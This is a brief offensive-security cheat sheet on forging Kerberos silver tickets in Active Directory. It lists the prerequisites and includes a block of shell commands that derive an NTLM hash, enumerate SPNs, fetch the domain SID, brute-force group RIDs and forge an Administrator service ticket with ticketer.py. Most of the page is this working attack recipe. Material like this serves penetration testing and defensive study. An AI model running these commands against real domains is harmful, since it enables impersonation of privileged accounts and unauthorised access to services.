# Silver Ticket

A silver ticket is a forged service ticket that allows an attacker to authenticate directly to a service without interacting with the KDC. These forged tickets are encrypted using the service account's password hash, making it possible to access the targeted service without a valid Ticket Granting Ticket (TGT)

Requirements :

* Service account NTLM hash
* Service SPN
* Domain SID
* Groups RID

{% hint style="danger" %}
When forging tickets, before November 2021 updates, the `user-id` and `groups-ids` were useful but the `username` supplied was mostly useless. As of Nov. 2021 updates, if the `username` supplied doesn't exist in Active Directory, the ticket gets rejected.
{% endhint %}

```shellscript
# Craft NTLM hash from clear text password
echo -n "<PASSWORD>" | iconv -t utf16le | openssl md4

# Service SPN
GetUserSPNs.py -dc-ip <IP> <DOMAIN>/<USER>:<PASSWORD>@<IP>

# Domain SID
nxc ldap <IP> -k -u <USER> -p '<PASSWORD>' --get-sid

# Get the RID of the AD groups
nxc smb <IP> -u <USER> -p '<PASSWORD>' --rid-brute

# Craft the ticket
ticketer.py  -nthash <HASH> -domain-sid '<DOMAIN_SID>' -domain <DOMAIN> -spn <SERVICE_SPN> Administrator -groups <GROUPS_RID>
```
